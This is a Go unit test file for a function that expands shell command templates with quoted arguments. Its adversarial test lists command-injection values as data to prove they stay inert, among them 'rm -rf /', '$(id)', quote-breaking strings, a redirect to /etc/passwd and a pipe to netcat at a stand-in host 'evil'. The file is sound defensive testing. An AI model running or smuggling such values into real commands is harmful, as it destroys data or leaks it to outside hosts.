package session

import "testing"

func TestExpandShellCommand(t *testing.T) {
	cases := []struct {
		name     string
		template string
		args     []string
		want     string
	}{
		{"no placeholders ignores args", "df -h", []string{"one", "two"}, "df -h"},
		{"positional", "systemctl restart $1", []string{"caddy"}, "systemctl restart 'caddy'"},
		{"absent positional is empty quoted", "echo $2", []string{"a"}, "echo ''"},
		{"star joins all when no positionals", "echo $*", []string{"a", "b"}, "echo 'a' 'b'"},
		{"star skips consumed args", "cmd $1 -- $*", []string{"a", "b", "c"}, "cmd 'a' -- 'b' 'c'"},
		{"star skips any referenced index", "cmd $2 $*", []string{"a", "b", "c"}, "cmd 'b' 'a' 'c'"},
		{"star with nothing left", "cmd $1 $*", []string{"a"}, "cmd 'a' "},
		{"literal dollar", "echo $$1", []string{"a"}, "echo $1"},
		{"unknown escape left as-is", "echo $HOME $0", []string{"a"}, "echo $HOME $0"},
		{"trailing dollar", "echo $", nil, "echo $"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := ExpandShellCommand(tc.template, tc.args); got != tc.want {
				t.Fatalf("got %q want %q", got, tc.want)
			}
		})
	}
}

// TestExpandShellCommandAdversarial pins the safety property: a hostile spoken
// argument stays a single inert literal word, never an operator or a second
// command.
func TestExpandShellCommandAdversarial(t *testing.T) {
	cases := []struct {
		arg  string
		want string
	}{
		{"a; rm -rf /", "echo 'a; rm -rf /'"},
		{"a && reboot", "echo 'a && reboot'"},
		{"`id`", "echo '`id`'"},
		{"$(id)", "echo '$(id)'"},
		{"'; id; '", `echo ''\''; id; '\'''`},
		{"a\nid", "echo 'a\nid'"},
		{"> /etc/passwd", "echo '> /etc/passwd'"},
		{"| nc evil 1234", "echo '| nc evil 1234'"},
		{"$1", "echo '$1'"},
		{"", "echo ''"},
	}
	for _, tc := range cases {
		got := ExpandShellCommand("echo $1", []string{tc.arg})
		if got != tc.want {
			t.Fatalf("arg %q: got %q want %q", tc.arg, got, tc.want)
		}
	}
	// The same holds through $*, including an argument that looks like a template.
	got := ExpandShellCommand("echo $*", []string{"$$", "a b", "'"})
	if want := `echo '$$' 'a b' ''\'''`; got != want {
		t.Fatalf("got %q want %q", got, want)
	}
}
